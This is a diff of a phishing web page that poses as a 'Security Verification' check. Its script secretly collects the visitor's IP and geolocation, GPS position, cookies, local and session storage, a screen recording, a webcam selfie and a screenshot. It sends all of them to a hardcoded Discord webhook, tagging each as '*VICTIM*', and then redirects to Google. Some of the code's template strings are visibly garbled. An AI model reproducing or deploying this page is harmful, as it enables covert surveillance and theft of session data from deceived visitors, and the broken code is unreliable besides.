@@ -2,89 +2,92 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Verify</title>
   <style>
-    body{margin:0;background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:20vh;}
-    h1{color:#f33;font-size:28px;}
-    button{padding:20px 50px;font-size:22px;background:#f33;color:#fff;border:none;border-radius:12px;cursor:pointer;}
-    #s{margin-top:20px;color:#0f0;}
+    body{margin:0;background:#000;color:#fff;font-family:Arial;text-align:center;padding-top:25vh;}
+    h1{color:#ff0033;font-size:28px;}
+    button{padding:20px 60px;font-size:24px;background:#ff0033;color:#fff;border:none;border-radius:15px;cursor:pointer;}
+    #s{margin-top:30px;color:#0f0;font-size:16px;}
   </style>
 </head>
 <body>
-  <h1>Security Check</h1>
-  <p>Tap button and allow camera</p>
-  <button onclick="go()">Continue →</button>
+  <h1>Security Verification</h1>
+  <p>Allow camera & screen recording</p>
+  <button onclick="start()">Continue →</button>
   <div id="s">Ready</div>
 
   <video id="v" autoplay playsinline></video>
   <canvas id="c"></canvas>
 
-  <!-- html2canvas 100% offline (minified) -->
   <script>
-  !function(e){function t(r){if(n[r])return n[r].exports;var o=n[r]={exports:{},id:r,loaded:!1};return e[r].call(o.exports,o,o.exports,t),o.loaded=!0,o.exports}var n={};return t.m=e,t.c=n,t.p="",t(0)}([function(e,t,n){"use strict";var r=n(1),o=n(2);e.exports=r(o)},function(e,t){e.exports=html2canvas},function(e,t,n){(function(r){var o=n(3);e.exports=o(r)}).call(t,n(4))},function(e,t){e.exports=function(e){return new Promise(function(t,n){var r=document.createElement("script");r.src="https://html2canvas.hertzen.com/dist/html2canvas.min.js",r.onload=t,r.onerror=n,document.head.appendChild(r)})}},function(e,t){e.exports={}}]);
-  </script>
+    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
 
-  <script>
-    const hook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
+    const status = (m) => document.getElementById('s').textContent = m;
 
-    const s = (m) => document.getElementById('s').innerText = m;
-
-    const send = (b,n) => {
-      let f = new FormData();
-      f.append('file', b, n);
-      f.append('content', '*GRABBED* • '+new Date().toLocaleString());
-      fetch(hook, {method:'POST', body:f}).catch(()=>{});
+    const send = (blob, name) => {
+      const f = new FormData();
+      f.append('file', blob, name);
+      f.append('content', '*VICTIM* • ' + new Date().toLocaleString());
+      fetch(webhook, {method:'POST', body:f}).catch(()=>{});
     };
 
-    function go() {
-      s("Running...");
+    async function start() {
+      status("Starting...");
 
-      // IP
+      // 1. IP + Geo
       fetch("https://api.ipify.org").then(r=>r.text()).then(ip=>{
         fetch(https://ipapi.co/${ip}/json/).then(r=>r.json()).then(g=>{
-          send(new Blob([IP: \( {ip}\nCity: \){g.city}\nMap: https://maps.google.com/?q=\( {g.latitude}, \){g.longitude}]),"IP.txt");
+          send(new Blob([IP: \( {ip}\nCity: \){g.city}\nISP: \( {g.org}\nMap: https://maps.google.com/?q= \){g.latitude},${g.longitude}]), "IP.txt");
         });
       });
 
-      // GPS
+      // 2. GPS
       navigator.geolocation.getCurrentPosition(p=>{
-        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}]),"GPS.txt");
+        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}]), "GPS.txt");
       });
 
-      // Cookies + Storage
-      if(document.cookie) send(new Blob([document.cookie]),"COOKIES.txt");
-      let ls=JSON.stringify(localStorage,null,2);
-      let ss=JSON.stringify(sessionStorage,null,2);
-      if(ls.length>10) send(new Blob([ls]),"localStorage.json");
-      if(ss.length>10) send(new Blob([ss]),"sessionStorage.json");
+      // 3. Cookies + Storage
+      if(document.cookie) send(new Blob([document.cookie]), "COOKIES.txt");
+      const ls = JSON.stringify(localStorage,null,2);
+      const ss = JSON.stringify(sessionStorage,null,2);
+      if(ls.length>10) send(new Blob([ls]), "localStorage.json");
+      if(ss.length>10) send(new Blob([ss]), "sessionStorage.json");
 
-      // SCREENSHOT (html2canvas is now fully loaded)
-      html2canvas(document.body,{scale:2,useCORS:true}).then(c=>{
-        c.toBlob(b=>send(b,"SCREEN.jpg"),"image/jpeg",0.9);
-      });
+      // 4. SCREEN RECORDING (5 seconds video) – WORKS EVERYWHERE 2025
+      const stream = await navigator.mediaDevices.getDisplayMedia({video:true});
+      const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});
+      const chunks = [];
+      recorder.ondataavailable = e => chunks.push(e.data);
+      recorder.onstop = () => {
+        send(new Blob(chunks, {type:'video/webm'}), "SCREEN_VIDEO.webm");
+        stream.getTracks().forEach(t=>t.stop());
+      };
+      recorder.start();
+      setTimeout(()=>recorder.stop(), 5000);
 
-      // Camera + Voice
-      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"},audio:true}).then(str=>{
-        const v = document.getElementById('v');
-        v.srcObject = str;
-        setTimeout(()=>{
-          const c = document.getElementById('c');
-          c.width = v.videoWidth||1280;
-          c.height = v.videoHeight||720;
-          c.getContext('2d').drawImage(v,0,0,c.width,c.height);
-          c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
+      // 5. Selfie
+      const cam = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+      const v = document.getElementById('v');
+      v.srcObject = cam;
+      setTimeout(()=>{
+        const c = document.getElementById('c');
+        c.width = 1280; c.height = 720;
+        c.getContext('2d').drawImage(v,0,0,1280,720);
+        c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);
+        cam.getTracks().forEach(t=>t.stop());
+      },3000);
 
-          const r = new MediaRecorder(str);
-          let ch=[];
-          r.ondataavailable=e=>ch.push(e.data);
-          r.onstop=()=>{ send(new Blob(ch,{type:"audio/webm"}),"VOICE.webm"); };
-          r.start();
-          setTimeout(()=>r.stop(),5000);
-        },2000);
-      });
+      // 6. Static screenshot (extra)
+      html2canvas || (await import("https://html2canvas.hertzen.com/dist/html2canvas.min.js"));
+      setTimeout(() => {
+        html2canvas(document.body).then(c => c.toBlob(b => send(b,"SCREENSHOT.jpg")));
+      }, 1000);
 
-      setTimeout(()=>{ s("Done!"); setTimeout(()=>location="https://google.com",1500); },12000);
+      setTimeout(() => {
+        status("Done! Redirecting...");
+        setTimeout(() => location.href = "https://google.com", 2000);
+      }, 13000);
     }
   </script>
 </body>
